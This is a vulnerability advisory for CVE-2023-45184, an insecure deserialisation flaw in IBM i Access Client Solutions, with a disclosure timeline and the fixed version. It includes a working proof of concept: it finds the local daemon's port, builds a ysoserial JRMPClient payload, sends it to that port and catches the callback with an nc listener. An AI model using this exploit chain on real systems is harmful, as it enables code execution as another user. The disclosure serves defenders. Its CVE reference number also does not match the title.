# CVE-2023-45184
IBM i Access Client Solutions < 1.1.9.4 - Remote code execution via insecure deserialisation.

## Timeline
- Vulnerability reported to vendor: 22.09.2023
- New fixed 1.1.9.4 version released: 08.12.2023
- Public disclosure: 15.12.2023

## Description

IBM i Access Client Solutions uses insecure deserialisation for password storage and obtaining decryption key for password encryption. This could be used by local or remote attacker to execute code. 

The local server can be easily found using the `netstat' command:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ netstat -nltp | grep java
tcp6       0      0 :::34307                :::*                    LISTEN      3225094/java         off (0.00/0/0)
```

We can confirm details about this local server using the `ps` command:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ ps aux | grep java
mmajchr+ 3224938  6.8  0.9 13305316 301392 pts/6 Sl+  12:30   0:17 java -jar ./acsbundle_1.9.new.jar
mmajchr+ 3225094  0.3  0.2 11512420 79692 pts/6  Sl+  12:30   0:00 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Djava.class.path=/tmp/ACS.lm13910263510749358977.jar -Dvisualvm.display.name=ACS Daemon -Dcom.ibm.tools.attach.displayName=ACS Daemon com.ibm.iaccess.base.LmHybridServerImpl
mkubiak  3238934  0.0  0.0   6464  1992 pts/12   R+   12:44   0:00 grep --color=auto java
```

We can achieve code execution by the user `mmajchrowicz` using the `ysoserial` payload from the `mkubiak` account:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ id
uid=1012(mkubiak) gid=1012(mkubiak) groups=1012(mkubiak),27(sudo)

┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ java -jar ysoserial.jar JRMPClient '127.0.0.1:9191' > jrmp.bin

┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ (sleep 3; cat jrmp.bin) | nat -6 ::1 34307 

```

In second terminal we will receive connection after execution of payload by service:
```
┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$ nc -lvnp 9191
listening on [any] 9191 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 38012
JRMIK

┌──(mkubiak㉿localhost)-[/tmp/mkubiak]
└─$
```

This problem was caused by an insecure deserialisation of network packets and user data. This issue is fixed in IBM i Access Client Solutions 1.1.9.4.

## Affected versions
< 1.1.9.4

## Advisory
Update IBM i Access Client Solutions to 1.1.9.4 or newer.

### References
* https://www.ibm.com/support/pages/node/7091942
* https://nvd.nist.gov/vuln/detail/CVE-2023-45185
